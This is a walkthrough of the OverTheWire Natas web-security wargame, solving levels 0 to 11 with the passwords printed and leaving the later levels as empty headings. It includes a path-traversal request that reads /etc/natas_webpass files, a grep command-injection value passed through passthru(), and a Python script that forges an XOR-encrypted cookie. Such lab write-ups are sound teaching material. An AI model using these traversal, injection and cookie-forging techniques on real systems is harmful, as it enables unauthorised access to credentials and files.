## Level 0
Looking at source reveals the password
```
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

## Level 1
Although right-click has been blocked, `Ctrl + U`(Chromium) should show source.
```
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## Level 2
Although there is nothing on this page, `<img src="files/pixel.png">` reveals directory containing file `users.txt` with password inside.
```
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```

## Level 3
`Not even Google will find it this time...` suggests that we should look at `robots.txt`.
```
User-agent: *
Disallow: /s3cr3t/
```
Once again, password is inside txt file `natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

## Level 4
This time, we're going to need some help from useful extensions. I'm using Postman with Postman interceptor for Chrome to spoof `Referer` variable. Sending request with referest set to `http://natas4.natas.labs.overthewire.org/index.php` will reveal the password.
```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```


## Level 5
Looking up source gives no clues. However, we can see that the cookie named `loggedin` is set to value `0`. Changing it to `1` will log us in.
```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## Level 6
We can look up the PHP source and see that file `includes/secret.inc` is included into the script. Because it's not interpreted by PHP we can directly see it in browser.
```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## Level 7
`/index.php?page=about` suggests that we've encountered a simple LFI. Hint in source code allows us to build request `index.php?page=../../../../../../etc/natas_webpass/natas8` which leads us to password `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

## Level 8
We have to undo actions performed to get `$encodedSecret`. To do this, first we convert hex to bytes, then reverse the string and unbase64.
```
encoded: 3d3d516343746d4d6d6c315669563362
unhexlified: ==QcCtmMml1ViV3b
reversed: b3ViV1lmMmtCcQ==
unbased: oubWYf2kBq
```
Submitting it revals the password: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

## Level 9
Let's take a look at source code.
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
Seems like we have to convince `grep` to match everything and read desired file. To match eveything, we'll use `'^\S*'`.
Passing `'^\S*' /etc/natas_webpass/natas10 #` will print the password `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`.

## Level 10
Our clever trick from previous level will work here as well, revealing password `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`.


## Level 11
```
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```
After looking at this code we can make out a few things. Cookie named `data` is storing representation of array. It is encrypted with some unknown key, and then encoded with base64. By default our cookie is storing data from `$deafultdata`. Now that we know both plaintext and ciphertext, we can extract encryption key and then encrypt our target configuration and send it as cookie. To do all these steps, I wrote a simple Python script, which prints new cookie.
```python
import itertools
import base64

cookie = 'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw='

origin = bytes('{"showpassword":"no","bgcolor":"#ffffff"}'.encode())
target = bytes('{"showpassword":"yes","bgcolor":"#ffffff"}'.encode())

# Remove b64 encoding
encrypted = bytes(base64.b64decode(cookie))

# XOR encrypted string with plaintext
key = bytes([ x^y for x,y in zip(encrypted, origin)])

# Cut to first 4 bytes
key = key[:4]

payload = [ x^y for x,y in zip(target, itertools.cycle(key))]

print(base64.b64encode(bytes(payload)).decode())
```
Sending new cookie oututs password.
`The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

## Level 12
## Level 13
## Level 14
## Level 15
## Level 16
## Level 17
## Level 18
## Level 19
## Level 20
## Level 21
## Level 22
## Level 23
## Level 24
## Level 25
## Level 26
## Level 27
## Level 28
## Level 29
## Level 30
## Level 31
## Level 32
## Level 33

